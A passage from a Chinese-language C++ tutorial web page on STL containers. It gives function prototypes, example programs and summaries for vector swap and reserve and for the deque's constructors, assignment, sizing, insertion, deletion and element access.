<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printVector</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v1;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printVector</span>(v2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//互换容器</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;互换后&quot;</span> &lt;&lt; endl;</span><br><span class="line">	v<span class="number">1.</span><span class="built_in">swap</span>(v2);</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line">	<span class="built_in">printVector</span>(v2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v的容量为：&quot;</span> &lt;&lt; v.<span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v的大小为：&quot;</span> &lt;&lt; v.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">resize</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v的容量为：&quot;</span> &lt;&lt; v.<span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v的大小为：&quot;</span> &lt;&lt; v.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//收缩内存</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(v).<span class="built_in">swap</span>(v); <span class="comment">//匿名对象</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v的容量为：&quot;</span> &lt;&lt; v.<span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v的大小为：&quot;</span> &lt;&lt; v.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>总结：swap可以使两个容器互换，可以达到实用的收缩内存效果</p>
<h4 id="3-2-8-vector预留空间"><a href="#3-2-8-vector预留空间" class="headerlink" title="3.2.8 vector预留空间"></a>3.2.8 vector预留空间</h4><p><strong>功能描述：</strong></p>
<ul>
<li>减少vector在动态扩展容量时的扩展次数</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>reserve(int len);</code>&#x2F;&#x2F;容器预留len个元素长度，预留位置不初始化，元素不可访问。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//预留空间</span></span><br><span class="line">	v.<span class="built_in">reserve</span>(<span class="number">100000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span>* p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">		<span class="keyword">if</span> (p != &amp;v[<span class="number">0</span>]) &#123;</span><br><span class="line">			p = &amp;v[<span class="number">0</span>];</span><br><span class="line">			num++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num:&quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：如果数据量较大，可以一开始利用reserve预留空间</p>
<h3 id="3-3-deque容器"><a href="#3-3-deque容器" class="headerlink" title="3.3 deque容器"></a>3.3 deque容器</h3><h4 id="3-3-1-deque容器基本概念"><a href="#3-3-1-deque容器基本概念" class="headerlink" title="3.3.1 deque容器基本概念"></a>3.3.1 deque容器基本概念</h4><p><strong>功能：</strong></p>
<ul>
<li>双端数组，可以对头端进行插入删除操作</li>
</ul>
<p><strong>deque与vector区别：</strong></p>
<ul>
<li>vector对于头部的插入删除效率低，数据量越大，效率越低</li>
<li>deque相对而言，对头部的插入删除速度回比vector快</li>
<li>vector访问元素时的速度会比deque快,这和两者内部实现有关</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002-1547547642923.jpg"
                      alt="说明: 2015-11-19_204101"
                ></p>
<p>deque内部工作原理:</p>
<p>deque内部有个<strong>中控器</strong>，维护每段缓冲区中的内容，缓冲区中存放真实数据</p>
<p>中控器维护的是每个缓冲区的地址，使得使用deque时像一片连续的内存空间</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002-1547547896341.jpg"
                      alt="clip_image002-1547547896341"
                ></p>
<ul>
<li>deque容器的迭代器也是支持随机访问的</li>
</ul>
<h4 id="3-3-2-deque构造函数"><a href="#3-3-2-deque构造函数" class="headerlink" title="3.3.2 deque构造函数"></a>3.3.2 deque构造函数</h4><p><strong>功能描述：</strong></p>
<ul>
<li>deque容器构造</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>deque&lt;T&gt;</code> deqT;                      &#x2F;&#x2F;默认构造形式</li>
<li><code>deque(beg, end);</code>                  &#x2F;&#x2F;构造函数将[beg, end)区间中的元素拷贝给本身。</li>
<li><code>deque(n, elem);</code>                    &#x2F;&#x2F;构造函数将n个elem拷贝给本身。</li>
<li><code>deque(const deque &amp;deq);</code>   &#x2F;&#x2F;拷贝构造函数</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printDeque</span><span class="params">(<span class="type">const</span> deque&lt;<span class="type">int</span>&gt;&amp; d)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::const_iterator it = d.<span class="built_in">begin</span>(); it != d.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//deque构造</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d1; <span class="comment">//无参构造函数</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		d<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printDeque</span>(d1);</span><br><span class="line">	<span class="function">deque&lt;<span class="type">int</span>&gt; <span class="title">d2</span><span class="params">(d<span class="number">1.</span>begin(),d<span class="number">1.</span>end())</span></span>;</span><br><span class="line">	<span class="built_in">printDeque</span>(d2);</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt;<span class="built_in">d3</span>(<span class="number">10</span>,<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d3);</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt;d4 = d3;</span><br><span class="line">	<span class="built_in">printDeque</span>(d4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>deque容器和vector容器的构造方式几乎一致，灵活使用即可</p>
<h4 id="3-3-3-deque赋值操作"><a href="#3-3-3-deque赋值操作" class="headerlink" title="3.3.3 deque赋值操作"></a>3.3.3 deque赋值操作</h4><p><strong>功能描述：</strong></p>
<ul>
<li>给deque容器进行赋值</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>deque&amp; operator=(const deque &amp;deq); </code>         &#x2F;&#x2F;重载等号操作符</p>
</li>
<li><p><code>assign(beg, end);</code>                                           &#x2F;&#x2F;将[beg, end)区间中的数据拷贝赋值给本身。</p>
</li>
<li><p><code>assign(n, elem);</code>                                             &#x2F;&#x2F;将n个elem拷贝赋值给本身。</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printDeque</span><span class="params">(<span class="type">const</span> deque&lt;<span class="type">int</span>&gt;&amp; d)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::const_iterator it = d.<span class="built_in">begin</span>(); it != d.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//赋值操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d1;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		d<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printDeque</span>(d1);</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt;d2;</span><br><span class="line">	d2 = d1;</span><br><span class="line">	<span class="built_in">printDeque</span>(d2);</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt;d3;</span><br><span class="line">	d<span class="number">3.</span><span class="built_in">assign</span>(d<span class="number">1.</span><span class="built_in">begin</span>(), d<span class="number">1.</span><span class="built_in">end</span>());</span><br><span class="line">	<span class="built_in">printDeque</span>(d3);</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt;d4;</span><br><span class="line">	d<span class="number">4.</span><span class="built_in">assign</span>(<span class="number">10</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d4);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：deque赋值操作也与vector相同，需熟练掌握</p>
<h4 id="3-3-4-deque大小操作"><a href="#3-3-4-deque大小操作" class="headerlink" title="3.3.4 deque大小操作"></a>3.3.4 deque大小操作</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对deque容器的大小进行操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>deque.empty();</code>                       &#x2F;&#x2F;判断容器是否为空</p>
</li>
<li><p><code>deque.size();</code>                         &#x2F;&#x2F;返回容器中元素的个数</p>
</li>
<li><p><code>deque.resize(num);</code>                &#x2F;&#x2F;重新指定容器的长度为num,若容器变长，则以默认值填充新位置。</p>
<p>​			                             &#x2F;&#x2F;如果容器变短，则末尾超出容器长度的元素被删除。</p>
</li>
<li><p><code>deque.resize(num, elem);</code>     &#x2F;&#x2F;重新指定容器的长度为num,若容器变长，则以elem值填充新位置。</p>
<p>​                                                     &#x2F;&#x2F;如果容器变短，则末尾超出容器长度的元素被删除。</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printDeque</span><span class="params">(<span class="type">const</span> deque&lt;<span class="type">int</span>&gt;&amp; d)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::const_iterator it = d.<span class="built_in">begin</span>(); it != d.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大小操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d1;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		d<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printDeque</span>(d1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断容器是否为空</span></span><br><span class="line">	<span class="keyword">if</span> (d<span class="number">1.</span><span class="built_in">empty</span>()) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;d1为空!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;d1不为空!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//统计大小</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;d1的大小为：&quot;</span> &lt;&lt; d<span class="number">1.</span><span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重新指定大小</span></span><br><span class="line">	d<span class="number">1.</span><span class="built_in">resize</span>(<span class="number">15</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d1);</span><br><span class="line"></span><br><span class="line">	d<span class="number">1.</span><span class="built_in">resize</span>(<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>deque没有容量的概念</li>
<li>判断是否为空   — empty</li>
<li>返回元素个数   — size</li>
<li>重新指定个数   — resize</li>
</ul>
<h4 id="3-3-5-deque-插入和删除"><a href="#3-3-5-deque-插入和删除" class="headerlink" title="3.3.5 deque 插入和删除"></a>3.3.5 deque 插入和删除</h4><p><strong>功能描述：</strong></p>
<ul>
<li>向deque容器中插入和删除数据</li>
</ul>
<p><strong>函数原型：</strong></p>
<p>两端插入操作：</p>
<ul>
<li><code>push_back(elem);</code>          &#x2F;&#x2F;在容器尾部添加一个数据</li>
<li><code>push_front(elem);</code>        &#x2F;&#x2F;在容器头部插入一个数据</li>
<li><code>pop_back();</code>                   &#x2F;&#x2F;删除容器最后一个数据</li>
<li><code>pop_front();</code>                 &#x2F;&#x2F;删除容器第一个数据</li>
</ul>
<p>指定位置操作：</p>
<ul>
<li><p><code>insert(pos,elem);</code>         &#x2F;&#x2F;在pos位置插入一个elem元素的拷贝，返回新数据的位置。</p>
</li>
<li><p><code>insert(pos,n,elem);</code>     &#x2F;&#x2F;在pos位置插入n个elem数据，无返回值。</p>
</li>
<li><p><code>insert(pos,beg,end);</code>    &#x2F;&#x2F;在pos位置插入[beg,end)区间的数据，无返回值。</p>
</li>
<li><p><code>clear();</code>                           &#x2F;&#x2F;清空容器的所有数据</p>
</li>
<li><p><code>erase(beg,end);</code>             &#x2F;&#x2F;删除[beg,end)区间的数据，返回下一个数据的位置。</p>
</li>
<li><p><code>erase(pos);</code>                    &#x2F;&#x2F;删除pos位置的数据，返回下一个数据的位置。</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printDeque</span><span class="params">(<span class="type">const</span> deque&lt;<span class="type">int</span>&gt;&amp; d)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::const_iterator it = d.<span class="built_in">begin</span>(); it != d.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//两端操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d;</span><br><span class="line">	<span class="comment">//尾插</span></span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	<span class="comment">//头插</span></span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">100</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//尾删</span></span><br><span class="line">	d.<span class="built_in">pop_back</span>();</span><br><span class="line">	<span class="comment">//头删</span></span><br><span class="line">	d.<span class="built_in">pop_front</span>();</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d;</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">100</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">	d.<span class="built_in">insert</span>(d.<span class="built_in">begin</span>(), <span class="number">1000</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">	d.<span class="built_in">insert</span>(d.<span class="built_in">begin</span>(), <span class="number">2</span>,<span class="number">10000</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt;d2;</span><br><span class="line">	d<span class="number">2.</span><span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	d<span class="number">2.</span><span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">	d<span class="number">2.</span><span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	d.<span class="built_in">insert</span>(d.<span class="built_in">begin</span>(), d<span class="number">2.</span><span class="built_in">begin</span>(), d<span class="number">2.</span><span class="built_in">end</span>());</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d;</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">100</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">	d.<span class="built_in">erase</span>(d.<span class="built_in">begin</span>());</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">	d.<span class="built_in">erase</span>(d.<span class="built_in">begin</span>(), d.<span class="built_in">end</span>());</span><br><span class="line">	d.<span class="built_in">clear</span>();</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">test03</span>();</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>插入和删除提供的位置是迭代器！</li>
<li>尾插   —  push_back</li>
<li>尾删   —  pop_back</li>
<li>头插   —  push_front</li>
<li>头删   —  pop_front</li>
</ul>
<h4 id="3-3-6-deque-数据存取"><a href="#3-3-6-deque-数据存取" class="headerlink" title="3.3.6 deque 数据存取"></a>3.3.6 deque 数据存取</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对deque 中的数据的存取操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>at(int idx); </code>     &#x2F;&#x2F;返回索引idx所指的数据</li>
<li><code>operator[]; </code>      &#x2F;&#x2F;返回索引idx所指的数据</li>
<li><code>front(); </code>            &#x2F;&#x2F;返回容器中第一个数据元素</li>
<li><code>back();</code>              &#x2F;&#x2F;返回容器中最后一个数据元素</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printDeque</span><span class="params">(<span class="type">const</span> deque&lt;<span class="type">int</span>&gt;&amp; d)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::const_iterator it = d.<span class="built_in">begin</span>(); it != d.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据存取</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d;</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">100</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; d.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">		cout &lt;&lt; d[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; d.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">		cout &lt;&lt; d.<span class="built_in">at</span>(i) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; d.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;back:&quot;</span> &lt;&lt; d.<span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span 